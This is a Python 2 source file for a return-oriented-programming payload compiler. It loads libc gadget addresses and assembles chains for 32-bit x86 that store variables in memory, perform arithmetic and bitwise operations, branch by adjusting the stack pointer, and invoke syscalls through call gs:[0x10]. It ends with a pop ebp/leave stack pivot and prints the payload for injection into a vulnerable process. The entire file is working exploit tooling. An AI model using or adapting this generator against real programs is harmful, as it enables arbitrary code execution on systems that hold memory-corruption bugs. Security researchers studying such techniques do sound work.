from helpers import *
import json


class Runner:

    #libc_base = 0xf7e737f0 - 0x4e7f0
    #mem_addr = 0x0804a040


    #start_mem =   0x804c87c - 2048
    #start_stack =   0x804a080

    def get_memory(self, size=4):
        current_mem = self.start_mem - 1024
        while True:
            yield current_mem
            current_mem += size

    def __init__(self, calculate_offsets=True, offsets=[]):		
        self.payload_blocks = []
        self.payload  = ""


        self.mem = self.get_memory()
        self.variables = {}
        self.pointers = []
        self.arrays = []

        if calculate_offsets:
            self.libc_base, self.mem_addr = fix_offsets()
        else:
            self.libc_base = offsets[0]
            self.mem_addr = offsets[1]

        self.start_stack = self.mem_addr
        self.start_mem = self.mem_addr + 10240 - 2048

        self.gadgets = json.load(open('gadget_address_list'))

        for g,addr in self.gadgets.items():
            self.gadgets[g] = self.libc_base + int(addr[:-1], 16)

    def create_pointer(self, name, target):
        self.create_variable(name, self.variables[target])
        self.pointers.append(name)

    def update_pointer(self, name, target):
        self.store_variable(name, self.variables[target])

    def create_new_payload_block(self):
        self.payload_blocks.append(self.payload)

        self.payload = ""

    def get_current_block(self):
        return len(self.payload_blocks)

    def checkpoint_blocks(self):
        current_len = len(self.payload)
        self.create_new_payload_block() 
        return len(self.payload_blocks)

    def get_last_block_length(self):
        return len(self.payload)

    def find_block_delta(self, start, end):
        block1 = start
        block2 = end

        if block1 == block2: return end[1] - start[1]

        #diff = len(self.payload_blocks[block1]) - start[1]
        diff = 0
        for idx in range(block1, block2): 
            diff += len(self.payload_blocks[idx])


        return diff

    def merge_payload_block(self, index, cond, delta):
        self.create_new_payload_block()
        self.conditions(cond, delta)

        self.payload_blocks.insert(index, self.payload)
        self.payload = ""


    def conditions(self, cond, delta, skip_sub=False):
        val1 = cond[0]
        val2 = cond[2]
        op = cond[1]
            
        if not skip_sub:
            if op == '==' or op == '<':
                self.sub_generic(val2, val1)
            else:
                self.sub_generic(val1, val2)

        
        if op == "==":
            if delta >= 0:
                self.jnz(delta)
            else:
                self.jnz(-delta, backwards=True)
        elif op == "<":
            if delta >= 0:
                self.jle(delta)
            else:
                self.jle(-delta, backwards=True)
        elif op == ">":  
            if delta >= 0:
                    self.jle(delta)
            else:
                self.jle(-delta, backwards=True)

    def create_variable(self, name, value=0x0):
        self.variables[name] = next(self.mem)

        if value in self.variables: value = self.variables[value]
        self.load_const_eax(value)

        self.store_memory(self.variables[name])

    def store_address_of(self, name, target):
        if target in self.variables: value = self.variables[target]
        self.load_const_eax(target)
        self.store_memory(self.variables[name])


    def store_variable(self, name, value):
        is_ptr_name = False
        if type(name) is str and name.startswith('*'):
            name = name[1:]
            is_ptr_name = True


        is_ptr_value = False
        if type(value) is str and value.startswith('*'):
            value = value[1:]
            is_ptr_value = True


        if not is_ptr_name and not is_ptr_value:
                if value in self.arrays:
                    self.update_pointer(name, value)
                else:
                    if value in self.variables:
                        value = self.variables[value]
                        self.load_memory(value)
                    else:
                        self.load_const_eax(value)
                    self.store_memory(self.variables[name])

        elif is_ptr_name and not is_ptr_value:
            self.load_memory(value)
            self.store_memory_pointer(name)

        elif not is_ptr_name and is_ptr_value:
            self.load_memory_from_pointer(value)
            self.store_memory(name)

        elif is_ptr_name and is_ptr_value:
            self.load_memory_from_pointer(value)
            self.store_memory_pointer(name)
        

    def finalize(self):
        if self.payload: 
            self.payload_blocks.append(self.payload)

        final_payload = "".join(self.payload_blocks)

        payload2 = self.push(final_payload)
        payload2 += self.stack_pivot(self.start_stack)

        print payload2


    def checkpoint(self):
        return len(self.payload)

    def get_zero_eax(self):
        #0x34964L: xor eax eax ;;
        self.payload += pack(self.gadgets["xor_eax_eax"])


    def load_const_eax(self, data, skip_pack=False):
        if data in self.variables: data = self.variables[data]

        #0xf5d71L: pop eax ;;
        self.payload += pack(self.gadgets["pop_eax"])
        if not skip_pack:
            self.payload += pack(data)
        else:
            self.payload += data


    def load_const_ebx(self, data):
        if data in self.variables: data = self.variables[data]

        #0x1976eL: pop ebx ;;
        self.payload += pack(self.gadgets["pop_ebx"])
        self.payload += pack(data)


    def load_const_ecx(self, data):
        if data in self.variables: data = self.variables[data]

        #0xf5d70L: pop ecx ; pop eax ;;
        temp = next(self.mem)
        self.store_memory(temp)
        self.payload += pack(self.gadgets["pop_ecx_eax"])
        self.payload += pack(data)
        self.payload += pack(0xffffffff)
        self.load_memory(temp)


    def load_const_edx(self, data, signed=False):
        if data in self.variables: data = self.variables[data]
        
        self.payload += pack(self.gadgets["pop_edx"]) #0x1aa2L: pop edx ;;

        if not signed:
            self.payload += pack(data)
        else:
            self.payload += pack_signed(data)



    def load_const_esi(self, data):
        if data in self.variables: data = self.variables[data]

        #0x2f44cL: pop esi ;;
        self.payload += pack(self.gadgets["pop_esi"])
        self.payload += pack(data)


    def load_const_edi(self, data):
        if data in self.variables: data = self.variables[data]

        #0x1c84aL: pop edi ;;
        self.payload += pack(self.gadgets["pop_edi"])
        self.payload += pack(data)


    ## Load memory value into eax (12)
    def load_memory(self, address):
        if address in self.variables: address = self.variables[address]

        self.load_const_eax(address - 0x40)
        self.payload += pack(self.gadgets["mov_eax_[eax+0x40]"]) #0x41d1a: mov eax,DWORD PTR [eax+0x40]


    def load_memory_edx(self, address):
        if address in self.variables: address = self.variables[address]

        self.load_memory(address)
        self.payload += pack(self.gadgets["xchg_edx_eax"]) # 0x141e5dL: xchg edx eax ;;


    ## Load memory value using pointer in eax.
    def load_memory_from_pointer(self, pointer):
        if pointer in self.variables: pointer = self.variables[pointer]

        self.load_const_eax(pointer)

        self.load_const_edx(0x40)
        self.payload += pack(self.gadgets["sub_eax_edx"]) #0x33c8bL: sub eax edx ;;
        self.payload += pack(self.gadgets["mov_eax_[eax+0x40]"]) #0x41d1a: mov eax, [eax+0x40]

        self.load_const_edx(0x40)
        self.payload += pack(self.gadgets["sub_eax_edx"]) #0x33c8bL: sub eax edx ;;
        self.payload += pack(self.gadgets["mov_eax_[eax+0x40]"]) #0x41d1a: mov eax, [eax+0x40]


    ## Store value in eax into memory (12)
    def store_memory(self, address):
        if address in self.variables: address = self.variables[address]

        self.load_const_edx(address - 0x18) 
        self.payload += pack(self.gadgets["mov_[edx+0x18]_eax"]) #0x2e8f2: mov DWORD PTR [edx+0x18],eax


    ## Store value in address pointed by pointer
    def store_memory_pointer(self, pointer):
        if pointer in self.variables: pointer = self.variables[pointer]

        temp = next(self.mem)
        self.store_memory(temp)

        self.load_memory(pointer)
        self.load_const_edx(0x18)
        self.payload += pack(self.gadgets["sub_eax_edx"]) #0x33c8bL: sub eax edx ;;

        self.payload += pack(self.gadgets["xchg_edx_eax"]) #0x141e5dL: xchg edx eax ;;
        self.load_memory(temp)
        self.payload += pack(self.gadgets["mov_[edx+0x18]_eax"]) #0x2e8f2: mov DWORD PTR [edx+0x18],eax


    def add(self, address):
        if address in self.variables: address = self.variables[address]

        self.load_const_edx(address)
        self.payload += pack(self.gadgets["add_eax_[edx]"]) #0x1928c6L: add eax [edx] ; inc eax ;;
        self.payload += pack(self.gadgets["dec_eax"]) #0x12dd56L: dec eax ;;

    
    def add_const(self, constant):
        self.load_const_edx(constant)  
        self.add_edx()

    def add_edx(self):
        self.payload += pack(self.gadgets["add_eax_edx"]) # 0x118999L: add eax edx ;;

    def add_const_to_memory(self, address, constant):
        if address in self.variables: address = self.variables[address]

        self.load_memory_edx(address)
        self.load_const_eax(constant)
        self.add_edx()
        self.store_memory(address)

    def add_memory_memory(self, address1, address2):
        if address1 in self.variables: address1 = self.variables[address1]
        if address2 in self.variables: address2 = self.variables[address2]

        self.load_memory_edx(address2)
        self.load_memory(address1)

        self.add_edx()


    def subtract(self, address):
        #Note: The larger value must be in eax
        if address in self.variables: address = self.variables[address]

        temp = next(self.mem)
        self.store_memory(temp)

        self.load_memory(address)
        self.negate()
        self.store_memory(address)

        self.load_memory(temp)
        self.add(address)


    def sub_edx(self):
        self.payload += pack(self.gadgets["sub_eax_edx"]) # 0x33c8bL: sub eax edx ;;
 

    def swap_eax_edx(self):
        self.payload += pack(self.gadgets["xchg_edx_eax"]) # 0x141e5dL: xchg edx eax ;;


    def sub_const(self, constant):
        self.load_const_edx(constant)  
        self.sub_edx()


    def sub_const_from_memory(self, address, constant):
        if address in self.variables: address = self.variables[address]

        self.load_memory(address)
        self.sub_const(constant)
        self.store_memory(address)


    def sub_memory_memory(self, address1, address2):
        if address1 in self.variables: address1 = self.variables[address1]
        if address2 in self.variables: address2 = self.variables[address2]

        self.load_memory_edx(address2)
        self.load_memory(address1)

        self.sub_edx()

    def sub_generic(self, val1, val2, res=None):
        is_var1 = False
        is_var2 = False
        if val1 in self.variables:
            val1 = self.variables[val1]
            is_var1 = True
        if val2 in self.variables: 
            val2 = self.variables[val2]
            is_var2 = True

        temp1 = next(self.mem)
        temp2 = next(self.mem)

        if is_var1 and is_var2:
            self.load_memory(val1)
            self.store_memory(temp1)
            self.load_memory(val2)
            self.store_memory(temp2)
            self.sub_memory_memory(temp1, temp2)
        elif is_var1:
            self.load_memory(val1)
            self.store_memory(temp1)

            self.load_const_eax(val2)
            self.store_memory(temp2)

            self.sub_memory_memory(temp1, temp2)
        elif is_var2:
            self.load_memory(val2)
            self.store_memory(temp2)

            self.load_const_eax(val1)
            self.store_memory(temp1)

            self.sub_memory_memory(temp1, temp2)
        else:
            self.load_const_edx(val2)
            self.load_const_eax(val1)
            self.sub_edx()

        if res:
            if res in self.variables: res = self.variables[res]
            self.store_memory(res)

    def xor(self, address):
        if address in self.variables: address = self.variables[address]

        arg1 = next(self.mem)
        self.store_memory(arg1)

        adjusted_address = (0xffffffff-0x5f5e14c4) + 1 + address
        self.load_const_ebx(adjusted_address  % 0xffffffff)

        self.load_memory(arg1)

        for idx in range(4):
            self.payload += pack(self.gadgets["xor_[eax+0x5f5e14c4]_al"]) #0x118638L: xor [ebx+0x5f5e14c4] al ;;
            self.payload += pack(self.gadgets["inc_ebx"]) #0x17cbdfL: inc ebx ;;
            self.payload += pack(self.gadgets["ror_eax_0x8"]) #0x1091caL: ror eax 0x8 ;;

        self.load_memory(address)


    def operation_generic(self, func, val1, val2, res=None):
        is_var1 = False
        is_var2 = False
        if val1 in self.variables:
            val1 = self.variables[val1]
            is_var1 = True
        if val2 in self.variables: 
            val2 = self.variables[val2]
            is_var2 = True

        temp1 = next(self.mem)
        temp2 = next(self.mem)


        if is_var1 and is_var2:
            self.load_memory(val1)
            self.store_memory(temp1)
            self.load_memory(val2)

            func(temp1)
        elif is_var1:
            self.load_memory(val1)
            self.store_memory(temp1)

            self.load_const_eax(val2)
            func(temp1)
        elif is_var2:
            self.load_memory(val2)
            self.store_memory(temp2)

            self.load_const_eax(val1)
            func(temp2)
        else:
            self.load_const_eax(val2)
            self.store_memory(temp2)

            self.load_const_eax(val1)
            func(temp2)

        if res:
            if res in self.variables: res = self.variables[res]
            self.store_memory(res)


    def and_(self, address):
        if address in self.variables: address = self.variables[address]

        arg1 = next(self.mem)
        self.store_memory(arg1)

        self.load_memory(address)
        self.payload += pack(self.gadgets["xchg_edx_eax"]) #0x141e5dL: xchg edx eax ;;
        self.load_memory(arg1) 
        self.payload += pack(self.gadgets["and_eax_edx"]) #0x2e3f5L: and eax edx ;;


    def or_(self, address):
        if address in self.variables: address = self.variables[address]

        arg1 = next(self.mem)
        self.store_memory(arg1)

        adjusted_address = (0xffffffff-0x040e4f02) + address
        self.load_const_ebx(adjusted_address % 0xffffffff)

        self.load_memory(arg1)

        for idx in range(4):
            self.payload += pack(self.gadgets["or_[ebx+0x40e4f02]_al"]) #0x18d9e4L: or [ebx+0x40e4f02] al ;;
            self.payload += pack(self.gadgets["inc_ebx"]) #0x17cbdfL: inc ebx ;;
            self.payload += pack(self.gadgets["ror_eax_0x8"]) #0x1091caL: ror eax 0x8 ;;

        self.load_memory(address)


    def left_rotate(self, count):
        temp = next(self.mem)
        self.store_memory(temp)

        adjusted_address = temp-0x17383f8
        self.load_const_ebx(adjusted_address)
        self.load_const_ecx(count)

        self.payload += pack(self.gadgets["rol_[ebx+0x17383f8]_cl"]) #0xf35e8L: rol dword [ebx+0x17383f8] cl ;;
        self.load_memory(temp)


    def right_rotate(self, count):   
        temp = next(self.mem)
        self.store_memory(temp)

        adjusted_address = temp-0x17383f8
        self.load_const_ebx(adjusted_address)
        self.load_const_ecx(32-count)

        self.payload += pack(self.gadgets["rol_[ebx+0x17383f8]_cl"]) #0xf35e8L: rol dword [ebx+0x17383f8] cl ;;
        self.load_memory(temp)


    def left_shift(self, count):
        temp = next(self.mem)

        self.left_rotate(count)
        self.store_memory(temp)

        mask = gen_mask(count, "left")
        
        self.load_const_eax(mask)
        self.and_(temp)


    def left_rotate_generic(self, val, count, result):
        if val in self.variables: 
            val = self.variables[val]
            self.load_memory(val)
        else:
            self.load_const_eax(val)

        self.left_rotate(count)

        if result in self.variables: 
            result = self.variables[result]

            self.store_memory(result)

    def right_rotate_generic(self, val, count, result):
        if val in self.variables: 
            val = self.variables[val]
            self.load_memory(val)
        else:
            self.load_const_eax(val)

        self.right_rotate(count)

        if result in self.variables: 
            result = self.variables[result]

            self.store_memory(result)


    def left_shift_generic(self, val, count, result):
        if val in self.variables: 
            val = self.variables[val]
            self.load_memory(val)
        else:
            self.load_const_eax(val)

        self.left_shift(count)

        if result in self.variables: 
            result = self.variables[result]

            self.store_memory(result)

    def right_shift_generic(self, val, count, result):
        if val in self.variables: 
            val = self.variables[val]
            self.load_memory(val)
        else:
            self.load_const_eax(val)

        self.right_shift(count)

        if result in self.variables: 
            result = self.variables[result]

            self.store_memory(result)

    def right_shift(self, count):
        temp = next(self.mem)

        self.right_rotate(count)
        self.store_memory(temp)

        mask = gen_mask(count, "right")
        
        self.load_const_eax(mask)
        self.and_(temp)


    def negate(self):
        #0xf1efcL: neg eax ;;
        self.payload += pack(self.gadgets["neg_eax"])


    def jump(self, address):
        if address in self.variables: address = self.variables[address]
        #0x7979aL: pop esp ;;
        self.payload += pack(self.gadgets["pop_esp"])
        self.payload += pack(address)


    def dec(self):
        #0x18112fL: dec eax ;;
        self.payload += pack(self.gadgets["dec_eax"])


    def store_string(self, data, address):
        if address in self.variables: address = self.variables[address]

        num_bytes = 0
        str_len = len(data) + 1
        if str_len % 4 != 0:
            num_bytes = (str_len + 4) / 4
        else:
            num_bytes = str_len / 4

        self.payload += ""
        for i in range(num_bytes):
            self.load_const_eax(data[i * 4:(i * 4) + 4].ljust(4, "\x00"), skip_pack=True)
            self.store_memory(address)

            if i < num_bytes - 1:
                address = next(self.mem)


    def jnz(self, esp_delta, backwards=False):
        #size 88(backwards), 84(forward)
        temp = next(self.mem)

        self.payload += pack(self.gadgets["pop_ecx_ebx"]) #0xffd12L: pop ecx ; pop ebx ;;
        self.payload += pack(0x0)
        self.payload += pack(0x0)
        self.negate()
        self.payload += pack(self.gadgets["adc_bl_ch"]) #0x118b53L: adc bl ch ;;
        self.payload += pack(self.gadgets["xchg_ebx_ecx"]) #0xf21f4L: xchg ebx ecx ;;
        self.payload += pack(self.gadgets["mov_eax_ecx"]) #0x14f87eL: mov eax ecx ;;
        self.negate()
        self.store_memory(temp)
        self.payload += pack(self.gadgets["pop_esi"]) #0x2f44cL: pop esi ;;
        self.payload += pack(temp)

        if backwards:
            self.load_const_eax(esp_delta+88)
            self.negate()
        else:
            self.load_const_eax(esp_delta)
        
        self.payload += pack(self.gadgets["and_[esi]_eax"]) #0x180bbaL: and [esi] eax ; or cl [esi] ; adc al 0x43 ;;
        self.load_const_eax(0x8)
        self.negate()
        self.payload += pack(self.gadgets["xchg_ecx_eax"]) #0x665a2L: xchg ecx eax ; mov eax 0x5b000000 ;;
        self.payload += pack(self.gadgets["add_esp_[esi+ecx+0x8]"]) #0x18f5bdL: add esp [esi+ecx+0x8] ;;


    def jle(self, esp_delta, backwards=False):
        #size 84(backwards), 80(forward)
        temp = next(self.mem)

        self.payload += pack(self.gadgets["pop_ecx_ebx"]) #0xffd12L: pop ecx ; pop ebx ;;
        self.payload += pack(0x0)
        self.payload += pack(0x0)
        #self.payload += negate()
        self.payload += pack(self.gadgets["adc_bl_ch"]) #0x118b53L: adc bl ch ;;
        self.payload += pack(self.gadgets["xchg_ebx_ecx"]) #0xf21f4L: xchg ebx ecx ;;
        self.payload += pack(self.gadgets["mov_eax_ecx"]) #0x14f87eL: mov eax ecx ;;
        self.negate()
        self.store_memory(temp)
        self.payload += pack(self.gadgets["pop_esi"]) #0x2f44cL: pop esi ;;
        self.payload += pack(temp)
        
        if backwards:
            self.load_const_eax(esp_delta+84)
            self.negate()
        else:
            self.load_const_eax(esp_delta)

        self.payload += pack(self.gadgets["and_[esi]_eax"]) #0x180bbaL: and [esi] eax ; or cl [esi] ; adc al 0x43 ;;
        self.load_const_eax(0x8)
        self.negate()
        self.payload += pack(self.gadgets["xchg_ecx_eax"]) #0x665a2L: xchg ecx eax ; mov eax 0x5b000000 ;;
        self.payload += pack(self.gadgets["add_esp_[esi+ecx+0x8]"]) #0x18f5bdL: add esp [esi+ecx+0x8] ;;
 

    def jge(self, esp_delta, backwards=False):
        #size 84+20+80 (backwards, confirm?)
        temp = next(self.mem)
        mask = next(self.mem)

        self.payload += pack(self.gadgets["pop_ecx_ebx"]) #0xffd12L: pop ecx ; pop ebx ;;
        self.payload += pack(0x0)
        self.payload += pack(0x0)
        #self.payload += negate()
        self.payload += pack(self.gadgets["adc_bl_ch"]) #0x118b53L: adc bl ch ;;

        self.load_const_eax(1)
        self.store_memory(mask)
        
        self.payload += pack(self.gadgets["xchg_ebx_ecx"]) #0xf21f4L: xchg ebx ecx ;;
        self.payload += pack(self.gadgets["mov_eax_ecx"]) #0x14f87eL: mov eax ecx ;;

        self.xor(mask)
        self.negate()
        self.store_memory(temp)
        self.payload += pack(self.gadgets["pop_esi"]) #0x2f44cL: pop esi ;;
        self.payload += pack(temp)
        self.load_const_eax(esp_delta)
        if backwards:
            self.negate()
        self.payload += pack(self.gadgets["and_[esi]_eax"]) #0x180bbaL: and [esi] eax ; or cl [esi] ; adc al 0x43 ;;
        self.load_const_eax(0x8)
        self.negate()
        self.payload += pack(self.gadgets["xchg_ecx_eax"]) #0x665a2L: xchg ecx eax ; mov eax 0x5b000000 ;;
        self.payload += pack(self.gadgets["add_esp_[esi+ecx+0x8]"]) #0x18f5bdL: add esp [esi+ecx+0x8] ;;


    def syscall(self, callnum, args, offset=0):   

        arg_count = len(args)

        if arg_count >= 1:
            self.load_const_ebx(args[0])
        if arg_count >= 2:
            self.load_const_ecx(args[1])
        if arg_count >= 3:
            self.load_const_edx(args[2])
        if arg_count >= 4:
            self.load_const_esi(args[3])
        if arg_count >= 5:
            self.load_const_esi(args[4])

        
        self.payload += pack(self.gadgets["add_esp_0x10"]) #0x27511L: add esp 0x10 ;;
        self.payload += "AAAA"
        self.payload += "BBBB"
        self.payload += "CCCC"
        self.payload += "DDDD"

        cur_len = self.current_payload_length()

        self.load_const_eax(callnum)
        
        self.payload += pack(self.gadgets["call_gs_[0x10]"]) #0xbb635L: call gs:[0x10] ;;

        fix_address = self.start_stack + cur_len + offset
        fix_stack = [pack(self.gadgets["pop_eax"]), pack(callnum), pack(self.gadgets["call_gs_[0x10]"])]

        for gadget in fix_stack:
            self.load_const_eax(gadget, skip_pack=True)
            self.store_memory(fix_address)

            fix_address += 4



    def current_payload_length(self):
        cur_len = 0
        for idx in range(len(self.payload_blocks)):
            cur_len += len(self.payload_blocks[idx])
        if self.payload: cur_len += len(self.payload)

        return cur_len
        
    def nop(self):
        #0x84cffL: nop ;;
        self.payload += pack(self.gadgets["nop"])


    def create_array(self, name, nums):
        self.create_variable(name)
        self.array(name, nums)
        self.arrays.append(name)

    def array(self, address, nums):

        if address in self.variables: address = self.variables[address]
        self.payload += ""
        for num in nums:
            self.load_const_eax(num)
            self.store_memory(address)

            address = next(self.mem)


    def stack_pivot(self, address):
        if address in self.variables: address = self.variables[address]
        
        payload2 = pack(self.gadgets["pop_ebp"]) #0x17776L: pop ebp ;;
        payload2 += pack(address)
        payload2 += pack(self.gadgets["leave"]) #0x113923L: leave ;;

        return payload2

    def push(self, data):
        payload2 = ""

        ptr = self.start_stack
        self.start_stack = ptr - 4

        for idx in range(0, len(data), 4):
            byte = data[idx:idx + 4]
            byte = byte.ljust(4, '\x00')

            payload2 += pack(self.gadgets["pop_eax"]) #0xf5d71L: pop eax ;;
            payload2 += byte

            payload2 += pack(self.gadgets["pop_edx"]) #0x1aa2L: pop edx ;;
            payload2 += pack(ptr - 0x18)

            payload2 += pack(self.gadgets["mov_[edx+0x18]_eax"]) #0x2e8f2: mov DWORD PTR [edx+0x18],eax

            ptr += 4

        return payload2


if __name__ == '__main__':
    r = Runner()
